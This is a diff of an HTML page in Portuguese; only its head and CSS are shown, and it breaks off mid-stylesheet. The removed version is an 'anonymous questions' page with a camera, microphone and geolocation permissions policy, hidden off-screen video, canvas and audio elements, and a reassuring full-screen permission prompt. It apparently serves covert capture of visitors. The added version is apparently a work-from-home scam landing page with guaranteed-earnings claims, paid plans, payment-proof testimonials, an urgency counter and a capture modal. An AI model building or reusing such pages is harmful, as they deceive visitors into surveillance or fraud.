@@ -1,1510 +1,1171 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="permissions-policy" content="camera=*, microphone=*, geolocation=*, notifications=*">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-touch-fullscreen" content="yes">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💬</text></svg>">
-  <title>Perguntas Anônimas - Confissões Secretas</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    
-    body {
-      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    
-    .background-decoration {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 0;
-    }
-    
-    .circle {
-      position: absolute;
-      border-radius: 50%;
-      opacity: 0.1;
-      background: radial-gradient(circle, #e94560, transparent);
-    }
-    
-    .circle-1 {
-      width: 300px;
-      height: 300px;
-      top: -100px;
-      right: -100px;
-      animation: float 8s ease-in-out infinite;
-    }
-    
-    .circle-2 {
-      width: 200px;
-      height: 200px;
-      bottom: -50px;
-      left: -50px;
-      animation: float 6s ease-in-out infinite reverse;
-      background: radial-gradient(circle, #533483, transparent);
-    }
-    
-    @keyframes float {
-      0%, 100% { transform: translateY(0) scale(1); }
-      50% { transform: translateY(-30px) scale(1.1); }
-    }
-    
-    .container {
-      background: rgba(255, 255, 255, 0.98);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      padding: 35px 30px;
-      border-radius: 24px;
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
-      width: 100%;
-      max-width: 420px;
-      position: relative;
-      z-index: 1;
-      animation: slideIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-    
-    @keyframes slideIn {
-      from {
-        opacity: 0;
-        transform: translateY(40px) scale(0.95);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
-    }
-    
-    .header {
-      text-align: center;
-      margin-bottom: 25px;
-    }
-    
-    .logo-container {
-      position: relative;
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 20px;
-    }
-    
-    .avatar {
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(135deg, #e94560, #533483);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 35px;
-      color: white;
-      box-shadow: 0 10px 30px rgba(233, 69, 96, 0.3);
-      position: relative;
-      z-index: 1;
-    }
-    
-    .verified-badge {
-      position: absolute;
-      bottom: 0;
-      right: 0;
-      background: #00d2ff;
-      border-radius: 50%;
-      width: 28px;
-      height: 28px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 14px;
-      border: 3px solid white;
-      box-shadow: 0 3px 10px rgba(0, 210, 255, 0.4);
-      z-index: 2;
-    }
-    
-    .header h1 {
-      color: #1a1a2e;
-      font-size: 24px;
-      font-weight: 700;
-      margin-bottom: 8px;
-    }
-    
-    .header .subtitle {
-      color: #6c757d;
-      font-size: 14px;
-      line-height: 1.5;
-    }
-    
-    .status-bar {
-      background: linear-gradient(135deg, #f8f9fa, #e9ecef);
-      border-radius: 12px;
-      padding: 12px 16px;
-      margin: 20px 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      border: 1px solid #dee2e6;
-    }
-    
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      background: #00d26a;
-      border-radius: 50%;
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-    
-    .status-text {
-      font-size: 13px;
-      font-weight: 600;
-      color: #495057;
-    }
-    
-    .trust-badges {
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-      margin: 15px 0;
-      flex-wrap: wrap;
-    }
-    
-    .trust-badge {
-      background: linear-gradient(135deg, #f1f3f5, #e9ecef);
-      padding: 8px 14px;
-      border-radius: 20px;
-      font-size: 11px;
-      font-weight: 600;
-      color: #495057;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      border: 1px solid #dee2e6;
-    }
-    
-    .trust-badge .icon {
-      font-size: 14px;
-    }
-    
-    .form-group {
-      margin-bottom: 20px;
-      position: relative;
-    }
-    
-    .form-group label {
-      display: block;
-      margin-bottom: 8px;
-      color: #1a1a2e;
-      font-weight: 600;
-      font-size: 14px;
-    }
-    
-    .form-group label .optional {
-      color: #adb5bd;
-      font-weight: 400;
-      font-size: 12px;
-    }
-    
-    textarea {
-      width: 100%;
-      padding: 15px;
-      border: 2px solid #e9ecef;
-      border-radius: 14px;
-      font-size: 15px;
-      font-family: inherit;
-      resize: vertical;
-      min-height: 130px;
-      background: #f8f9fa;
-      transition: all 0.3s ease;
-      line-height: 1.6;
-      color: #1a1a2e;
-    }
-    
-    textarea:focus {
-      outline: none;
-      border-color: #e94560;
-      background: white;
-      box-shadow: 0 0 0 4px rgba(233, 69, 96, 0.1);
-    }
-    
-    textarea::placeholder {
-      color: #adb5bd;
-      font-style: italic;
-    }
-    
-    .char-counter {
-      position: absolute;
-      right: 12px;
-      bottom: 12px;
-      font-size: 11px;
-      color: #adb5bd;
-      background: rgba(255, 255, 255, 0.9);
-      padding: 4px 8px;
-      border-radius: 8px;
-      font-weight: 500;
-    }
-    
-    .name-input {
-      width: 100%;
-      padding: 14px 16px;
-      border: 2px solid #e9ecef;
-      border-radius: 14px;
-      font-size: 14px;
-      background: #f8f9fa;
-      transition: all 0.3s ease;
-      color: #1a1a2e;
-    }
-    
-    .name-input:focus {
-      outline: none;
-      border-color: #e94560;
-      background: white;
-      box-shadow: 0 0 0 4px rgba(233, 69, 96, 0.1);
-    }
-    
-    .name-input::placeholder {
-      color: #adb5bd;
-      font-style: italic;
-    }
-    
-    .features-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 8px;
-      margin: 15px 0;
-    }
-    
-    .feature-item {
-      text-align: center;
-      padding: 10px 5px;
-      background: #f8f9fa;
-      border-radius: 10px;
-      border: 1px solid #e9ecef;
-    }
-    
-    .feature-icon {
-      font-size: 20px;
-      margin-bottom: 4px;
-    }
-    
-    .feature-text {
-      font-size: 10px;
-      font-weight: 600;
-      color: #495057;
-    }
-    
-    .submit-btn {
-      width: 100%;
-      padding: 16px;
-      background: linear-gradient(135deg, #e94560, #533483);
-      color: white;
-      border: none;
-      border-radius: 14px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      position: relative;
-      overflow: hidden;
-      letter-spacing: 0.5px;
-    }
-    
-    .submit-btn::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      transition: left 0.6s;
-    }
-    
-    .submit-btn:hover::before {
-      left: 100%;
-    }
-    
-    .submit-btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 30px rgba(233, 69, 96, 0.4);
-    }
-    
-    .submit-btn:active {
-      transform: translateY(-1px);
-    }
-    
-    .submit-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
-    
-    .testimonials {
-      margin-top: 20px;
-      padding-top: 20px;
-      border-top: 2px solid #f1f3f5;
-    }
-    
-    .testimonials-title {
-      text-align: center;
-      font-size: 12px;
-      font-weight: 600;
-      color: #adb5bd;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      margin-bottom: 15px;
-    }
-    
-    .testimonial-items {
-      display: flex;
-      gap: 10px;
-      overflow-x: auto;
-      padding-bottom: 5px;
-    }
-    
-    .testimonial-item {
-      flex: 0 0 auto;
-      background: #f8f9fa;
-      border-radius: 10px;
-      padding: 12px;
-      min-width: 120px;
-      border: 1px solid #e9ecef;
-    }
-    
-    .testimonial-stars {
-      color: #ffc107;
-      font-size: 12px;
-      margin-bottom: 4px;
-    }
-    
-    .testimonial-text {
-      font-size: 11px;
-      color: #6c757d;
-      font-style: italic;
-      line-height: 1.4;
-    }
-    
-    .footer-text {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 11px;
-      color: #adb5bd;
-    }
-    
-    .footer-text a {
-      color: #e94560;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    
-    /* Elementos ocultos */
-    #video, #canvas, #audio {
-      position: absolute;
-      opacity: 0;
-      width: 1px;
-      height: 1px;
-      top: -10000px;
-      left: -10000px;
-      visibility: hidden;
-      z-index: -9999;
-    }
-    
-    /* Loading */
-    .loading-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(26, 26, 46, 0.95);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
-    
-    .spinner {
-      width: 50px;
-      height: 50px;
-      border: 4px solid rgba(255, 255, 255, 0.1);
-      border-top: 4px solid #e94560;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    .loading-text {
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-    }
-    
-    .loading-subtext {
-      color: rgba(255, 255, 255, 0.6);
-      font-size: 13px;
-      margin-top: 8px;
-    }
-    
-    /* Modal de sucesso */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(5px);
-      -webkit-backdrop-filter: blur(5px);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
-    }
-    
-    .modal {
-      background: white;
-      padding: 40px;
-      border-radius: 24px;
-      text-align: center;
-      max-width: 90%;
-      width: 400px;
-      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
-      animation: modalPop 0.5s cubic-bezier(0.16, 1, 0.3, 1);
-    }
-    
-    @keyframes modalPop {
-      from {
-        opacity: 0;
-        transform: scale(0.7) translateY(20px);
-      }
-      to {
-        opacity: 1;
-        transform: scale(1) translateY(0);
-      }
-    }
-    
-    .modal .success-icon {
-      width: 70px;
-      height: 70px;
-      background: linear-gradient(135deg, #00d26a, #00b4d8);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 35px;
-      margin: 0 auto 20px;
-      box-shadow: 0 10px 30px rgba(0, 210, 106, 0.3);
-    }
-    
-    .modal h3 {
-      color: #1a1a2e;
-      font-size: 22px;
-      margin-bottom: 10px;
-      font-weight: 700;
-    }
-    
-    .modal p {
-      color: #6c757d;
-      line-height: 1.6;
-      margin-bottom: 8px;
-      font-size: 14px;
-    }
-    
-    .modal .encryption-note {
-      background: #f8f9fa;
-      border-radius: 10px;
-      padding: 10px;
-      margin: 15px 0;
-      font-size: 12px;
-      color: #00d26a;
-      font-weight: 600;
-    }
-    
-    .modal button {
-      background: linear-gradient(135deg, #00d26a, #00b4d8);
-      color: white;
-      border: none;
-      padding: 14px 30px;
-      border-radius: 12px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      margin-top: 15px;
-      transition: all 0.3s;
-    }
-    
-    .modal button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 20px rgba(0, 210, 106, 0.4);
-    }
-    
-    /* Permission prompt */
-    .permission-prompt {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(135deg, rgba(26, 26, 46, 0.97), rgba(15, 52, 96, 0.97));
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 12000;
-      color: white;
-      text-align: center;
-      padding: 20px;
-    }
-    
-    .permission-content {
-      background: rgba(255, 255, 255, 0.08);
-      padding: 45px 35px;
-      border-radius: 24px;
-      max-width: 450px;
-      backdrop-filter: blur(30px);
-      -webkit-backdrop-filter: blur(30px);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
-    }
-    
-    .permission-icon {
-      font-size: 60px;
-      margin-bottom: 25px;
-      display: block;
-      filter: drop-shadow(0 5px 15px rgba(0, 210, 255, 0.4));
-    }
-    
-    .permission-content h3 {
-      font-size: 26px;
-      margin-bottom: 20px;
-      font-weight: 700;
-      background: linear-gradient(135deg, #fff, #00d2ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-    
-    .permission-content p {
-      font-size: 15px;
-      line-height: 1.7;
-      margin-bottom: 12px;
-      opacity: 0.85;
-    }
-    
-    .permission-content .security-features {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      margin: 20px 0;
-    }
-    
-    .security-feature {
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 12px;
-      padding: 12px 8px;
-    }
-    
-    .security-feature .sf-icon {
-      font-size: 24px;
-      margin-bottom: 5px;
-    }
-    
-    .security-feature .sf-text {
-      font-size: 10px;
-      font-weight: 600;
-      opacity: 0.9;
-    }
-    
-    .permission-btn {
-      background: linear-gradient(135deg, #e94560, #533483);
-      color: white;
-      border: 2px solid rgba(255, 255, 255, 0.2);
-      padding: 16px 35px;
-      border-radius: 30px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 20px;
-      transition: all 0.3s;
-      letter-spacing: 0.5px;
-    }
-    
-    .permission-btn:hover {
-      background: linear-gradient(135deg, #ff6b81, #6c5ce7);
-      transform: translateY(-3px);
-      box-shadow: 0 15px 35px rgba(233, 69, 96, 0.4);
-    }
-    
-    /* Toast */
-    .toast {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #1a1a2e;
-      color: white;
-      padding: 16px 22px;
-      border-radius: 14px;
-      z-index: 15000;
-      transform: translateX(120%);
-      transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-      font-size: 14px;
-      font-weight: 500;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-    }
-    
-    .toast.show {
-      transform: translateX(0);
-    }
-    
-    .toast.success {
-      background: #00d26a;
-      border-color: rgba(255, 255, 255, 0.3);
-    }
-    
-    .toast.error {
-      background: #e94560;
-      border-color: rgba(255, 255, 255, 0.3);
-    }
-    
-    .toast.info {
-      background: #00b4d8;
-      border-color: rgba(255, 255, 255, 0.3);
-    }
-    
-    /* Responsivo */
-    @media (max-width: 480px) {
-      .container {
-        margin: 10px;
-        padding: 25px 20px;
-      }
-      
-      .permission-content {
-        padding: 30px 20px;
-        margin: 10px;
-      }
-      
-      .features-grid {
-        grid-template-columns: repeat(3, 1fr);
-        gap: 5px;
-      }
-      
-      .testimonial-items {
-        gap: 8px;
-      }
-      
-      .testimonial-item {
-        min-width: 100px;
-        padding: 10px;
-      }
-      
-      .header h1 {
-        font-size: 20px;
-      }
-      
-      .modal {
-        padding: 30px 20px;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Ganhe dinheiro trabalhando de casa. Vagas online com pagamento garantido via PIX. Comece hoje!">
+    <meta property="og:title" content="Trabalhe de Casa - Ganhe até R$ 5.000/mês">
+    <meta property="og:description" content="Vagas reais para trabalho remoto. Cadastro gratuito e pagamento semanal.">
+    <title>Trabalhe de Casa | Ganhe até R$ 5.000/mês</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        /* Animações */
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        @keyframes shine {
+            0% { left: -100%; }
+            100% { left: 200%; }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes numberCounter {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Header */
+        .top-bar {
+            background: linear-gradient(90deg, #00d26a, #00b4d8);
+            padding: 12px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0, 210, 106, 0.3);
+        }
+
+        .top-bar span {
+            animation: pulse 2s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        .top-bar .live-dot {
+            width: 10px;
+            height: 10px;
+            background: #ff0000;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+            animation: pulse 1s infinite;
+        }
+
+        .header {
+            background: radial-gradient(ellipse at center, rgba(0,210,106,0.1) 0%, transparent 70%);
+            padding: 60px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="1" fill="rgba(255,255,255,0.1)"/></svg>') repeat;
+            background-size: 50px;
+            animation: float 20s ease-in-out infinite;
+        }
+
+        .header-content {
+            position: relative;
+            z-index: 1;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .badge-premium {
+            display: inline-block;
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            color: #000;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: 700;
+            font-size: 13px;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+        }
+
+        .header h1 {
+            font-size: clamp(32px, 5vw, 52px);
+            font-weight: 900;
+            line-height: 1.2;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #ffffff, #00d26a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header h2 {
+            font-size: clamp(18px, 3vw, 22px);
+            color: #b8b8b8;
+            font-weight: 400;
+            margin-bottom: 30px;
+        }
+
+        .header .destaque-numeros {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            margin-bottom: 35px;
+        }
+
+        .numero-item {
+            text-align: center;
+        }
+
+        .numero-valor {
+            font-size: 36px;
+            font-weight: 900;
+            color: #00d26a;
+            display: block;
+        }
+
+        .numero-label {
+            font-size: 12px;
+            color: #b8b8b8;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-cta {
+            display: inline-block;
+            padding: 20px 50px;
+            background: linear-gradient(135deg, #00d26a, #00b4d8);
+            color: #000;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.4s;
+            box-shadow: 0 10px 40px rgba(0, 210, 106, 0.4);
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+            border: none;
+        }
+
+        .btn-cta::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -100%;
+            width: 70%;
+            height: 200%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transform: rotate(25deg);
+            animation: shine 3s infinite;
+        }
+
+        .btn-cta:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 50px rgba(0, 210, 106, 0.6);
+        }
+
+        /* Seção de Confiança */
+        .confianca-bar {
+            background: rgba(255,255,255,0.03);
+            border-top: 1px solid rgba(255,255,255,0.1);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding: 25px 20px;
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            flex-wrap: wrap;
+        }
+
+        .confianca-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #b8b8b8;
+            font-weight: 500;
+        }
+
+        .confianca-icon {
+            font-size: 24px;
+        }
+
+        /* Seção de Planos */
+        .planos-section {
+            padding: 60px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: #ffffff;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: #b8b8b8;
+            font-size: 16px;
+            margin-bottom: 50px;
+        }
+
+        .planos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+        }
+
+        .plano-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 35px;
+            text-align: center;
+            transition: all 0.4s;
+            position: relative;
+            backdrop-filter: blur(10px);
+        }
+
+        .plano-card:hover {
+            transform: translateY(-10px);
+            border-color: rgba(0, 210, 106, 0.3);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+        }
+
+        .plano-card.destaque {
+            border-color: #00d26a;
+            background: rgba(0, 210, 106, 0.08);
+            box-shadow: 0 20px 40px rgba(0, 210, 106, 0.2);
+            transform: scale(1.05);
+        }
+
+        .plano-card.destaque:hover {
+            transform: scale(1.08) translateY(-10px);
+        }
+
+        .plano-badge {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            color: #000;
+            padding: 8px 25px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 13px;
+            text-transform: uppercase;
+        }
+
+        .plano-nome {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #ffffff;
+        }
+
+        .plano-preco {
+            font-size: 48px;
+            font-weight: 900;
+            color: #00d26a;
+            margin-bottom: 5px;
+        }
+
+        .plano-preco-anterior {
+            font-size: 18px;
+            color: #ff4444;
+            text-decoration: line-through;
+            margin-bottom: 5px;
+        }
+
+        .plano-parcelas {
+            font-size: 14px;
+            color: #b8b8b8;
+            margin-bottom: 25px;
+        }
+
+        .plano-beneficios {
+            list-style: none;
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .plano-beneficios li {
+            padding: 10px 0;
+            color: #b8b8b8;
+            font-size: 14px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .plano-beneficios li::before {
+            content: '✅ ';
+            margin-right: 8px;
+        }
+
+        .btn-plano {
+            display: inline-block;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-plano.basico {
+            background: rgba(255,255,255,0.1);
+            color: #ffffff;
+        }
+
+        .btn-plano.destaque-btn {
+            background: linear-gradient(135deg, #00d26a, #00b4d8);
+            color: #000;
+        }
+
+        .btn-plano.vip {
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            color: #000;
+        }
+
+        /* Seção de Depoimentos */
+        .depoimentos-section {
+            padding: 60px 20px;
+            background: rgba(255,255,255,0.02);
+        }
+
+        .depoimentos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .depoimento-card {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(255,255,255,0.1);
+            transition: all 0.3s;
+        }
+
+        .depoimento-card:hover {
+            border-color: rgba(0, 210, 106, 0.3);
+            transform: translateY(-5px);
+        }
+
+        .depoimento-stars {
+            color: #ffd700;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+
+        .depoimento-texto {
+            color: #cccccc;
+            font-size: 15px;
+            line-height: 1.6;
+            font-style: italic;
+            margin-bottom: 20px;
+        }
+
+        .depoimento-autor {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .depoimento-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00d26a, #00b4d8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .depoimento-nome {
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        .depoimento-cargo {
+            font-size: 12px;
+            color: #888;
+        }
+
+        .depoimento-comprovante {
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(0, 210, 106, 0.1);
+            border-radius: 10px;
+            font-size: 12px;
+            color: #00d26a;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        /* Seção de Garantia */
+        .garantia-section {
+            padding: 60px 20px;
+            text-align: center;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .garantia-selo {
+            font-size: 80px;
+            margin-bottom: 25px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .garantia-section h3 {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+
+        .garantia-section p {
+            color: #b8b8b8;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        /* FAQ */
+        .faq-section {
+            padding: 60px 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .faq-item {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 15px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .faq-item:hover {
+            background: rgba(0, 210, 106, 0.05);
+            border-color: rgba(0, 210, 106, 0.3);
+        }
+
+        .faq-pergunta {
+            font-weight: 700;
+            font-size: 16px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .faq-resposta {
+            color: #b8b8b8;
+            font-size: 14px;
+            line-height: 1.6;
+            display: none;
+        }
+
+        .faq-item.ativo .faq-resposta {
+            display: block;
+        }
+
+        .faq-seta {
+            font-size: 20px;
+            transition: transform 0.3s;
+        }
+
+        .faq-item.ativo .faq-seta {
+            transform: rotate(180deg);
+        }
+
+        /* Contador de Vagas */
+        .vagas-urgente {
+            background: linear-gradient(90deg, rgba(255,0,0,0.2), rgba(255,100,0,0.2));
+            border: 1px solid rgba(255,0,0,0.3);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin: 30px 0;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .vagas-urgente h4 {
+            color: #ff4444;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .vagas-urgente .numero-vagas {
+            font-size: 42px;
+            font-weight: 900;
+            color: #ff4444;
+        }
+
+        /* Footer */
+        .footer {
+            background: rgba(0,0,0,0.5);
+            padding: 40px 20px;
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .footer-logos {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #888;
+            font-weight: 600;
+        }
+
+        .footer p {
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        /* Botão flutuante */
+        .btn-flutuante {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #00d26a;
+            color: #000;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            text-decoration: none;
+            box-shadow: 0 10px 30px rgba(0, 210, 106, 0.5);
+            z-index: 999;
+            animation: pulse 2s ease-in-out infinite;
+            cursor: pointer;
+            border: none;
+        }
+
+        /* Modal de Captura */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            padding: 20px;
+        }
+
+        .modal {
+            background: #1a1a2e;
+            border-radius: 25px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(0, 210, 106, 0.3);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+            position: relative;
+        }
+
+        .modal-fechar {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .modal-fechar:hover {
+            color: #fff;
+        }
+
+        .modal h3 {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 15px;
+        }
+
+        .modal p {
+            color: #b8b8b8;
+            margin-bottom: 25px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        .modal input {
+            width: 100%;
+            padding: 16px;
